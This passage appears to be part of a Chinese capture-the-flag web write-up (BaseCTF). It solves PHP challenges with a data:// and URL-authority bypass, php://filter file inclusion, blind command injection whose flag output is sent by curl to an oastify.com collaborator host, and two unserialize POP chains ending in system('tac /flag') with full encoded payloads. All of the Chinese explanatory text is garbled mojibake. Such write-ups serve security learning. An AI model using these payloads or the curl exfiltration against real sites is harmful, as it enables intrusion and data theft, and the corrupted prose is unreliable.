   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// ç¤¼ç‰©æ”¶åˆ°å•¦ï¼Œæ¥ä¸‹æ¥è¦å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~ </span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// å˜¿å˜¿ï¼Œæ¥ä¸‹æ¥è¦æ‹†å¼€ç¤¼ç‰©å•¦ï¼Œæ‚„æ‚„å‘Šè¯‰ä½ ï¼Œç¤¼ç‰©åœ¨ flag.php é‡Œé¢å“¦~ </span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p><strong>file_get_contents()</strong></p><p>è¯­æ³•ï¼šfile_get_contents(path,include_path,context,start,max_length)</p><p>è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²é‡Œçš„æ–¹æ³•ã€‚</p><p>è¿™ä¸ªå‡½æ•°ç»•è¿‡æ–¹å¼æœ‰å¤šç§ï¼š</p><p><strong>php:&#x2F;&#x2F;inputä¼ªåè®®ç»•è¿‡</strong></p><ol><li>å°†è¦GETçš„å‚æ•°?xxx&#x3D;php:&#x2F;&#x2F;input</li><li>ç”¨postæ–¹æ³•ä¼ å…¥æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼</li></ol><p><strong>data:&#x2F;&#x2F;ä¼ªåè®®ç»•è¿‡</strong></p><ol><li>?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,æƒ³è¦file_get_contents()å‡½æ•°è¿”å›çš„å€¼çš„base64ç¼–ç </li><li>?xxx&#x3D;data:text&#x2F;plain,(urlç¼–ç çš„å†…å®¹)</li></ol><p>è¿™é‡Œå› ä¸ºæ˜¯POSTä¼ å‚æ‰€ä»¥é‡‡ç”¨data</p><p>strposå‡½æ•°æ˜¯è¿”å›éœ€è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨ç›®æ ‡å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™é‡Œè¦æ±‚ä¸º0ï¼Œæ„å‘³ç€å¿…é¡»åœ¨å¼€å¤´å‡ºç°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io</span></code></pre><p>ç¬¬ä¸‰ä¸ªç»•è¿‡éœ€è¦ç”¨<code>file_get_contents</code>ä¼ å…¥<code>challenge</code>å˜é‡ï¼Œè¿™é‡Œè€ƒç‚¹ä¸º<code>file_get_contents</code>æœ¬æ¥çš„ç”¨æ³•ï¼Œä»¥åŠurlè·³è½¬</p><p>æœ¬é¡µé¢å°±æœ‰<strong>å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦</strong>çš„å­—æ ·</p><p>æ‰€ä»¥ä¼ å…¥<code>challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657/</code>å³å¯ç»•è¿‡</p><p>æœ€åå°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡ä»¶åŒ…å«</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span>pen<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:22657&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span></code></pre><h4 id="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"><a href="#ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³" class="headerlink" title="ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³"></a>ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>æ²¡å›æ˜¾ï¼Œæœ¬æ¥æƒ³åå¼¹shellï¼Œæ²¡æˆåŠŸï¼Œç›´æ¥ç”¨bpçš„Collaboratorå¤–å¸¦å‡ºæ¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>cmd<span class="token operator">=</span>curl<span class="token operator">%</span><span class="token number">2017698</span>qgbtquwasnhu67e3mej1a71vsjh<span class="token operator">.</span>oastify<span class="token operator">.</span>com<span class="token operator">/</span><span class="token string backtick-quoted-string">`tac%20/flag`</span></code></pre><p><img src="shell_exec.png" loading="lazy"></p><h4 id="ez-ser"><a href="#ez-ser" class="headerlink" title="ez_ser"></a>ez_ser</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>Popé“¾å¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">re</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">kw</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token property">over</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Misc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ser<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>web<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>kw<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>re<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>chu0<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>pwn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>dusk<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>over<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Misc<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>nothing<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>flag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo 123;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello, World!'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Shark says:'</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">word</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$sea_ani</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">animal</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'In a deep deep sea, there is a '</span> <span class="token operator">.</span> <span class="token variable">$sea_ani</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">see</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$nature</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>Popé“¾ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sink</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Shark</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$word</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Sea</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$animal</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Nature</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sea</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Nature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sea</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">sea</span><span class="token operator">-></span><span class="token property">animal</span><span class="token operator">-></span><span class="token property">word</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac\$&#123;IFS&#125;/flag');"</span><span class="token punctuation">;</span><span class="token variable">$tmp</span><span class="token operator">=</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"word"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Shark%00word"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä¸è¦å¿˜è®°ä¿®æ”¹å‰é¢çš„æ•°å­—</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"%00Sink%00cmd"</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span></span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>nature<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Nature<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sea<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>animal<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Shark<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Shark<span class="token operator">%</span><span class="token number">00</span>word<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Sink<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>tac<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">7</span>BIFS<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><p>å€¼å¾—ä¸€æçš„æ˜¯å› ä¸ºSharkä¸­çš„wordå’ŒSinkçš„cmdä¸ºç§æœ‰å˜é‡ï¼Œæ‰€ä»¥è¦æ‰‹åŠ¨æ”¹å˜å…¶urlç¼–ç åçš„ç»“æœ</p><pre class="language-php" data-language="php"><code class="language-php">cmd <span class="token operator">--</span><span class="token operator">></span> <span class="token operator">%</span><span class="token number">00</span>Sink<span class="token operator">%</span><span class="token number">00</span>cmd  s<span class="token punctuation">:</span><span class="token number">3</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">s</span><span class="token punctuation">:</span><span class="token number">9</span></code></pre><h4 id="æ•°å­¦å¤§å¸ˆ"><a href="#æ•°å­¦å¤§å¸ˆ" class="headerlink" 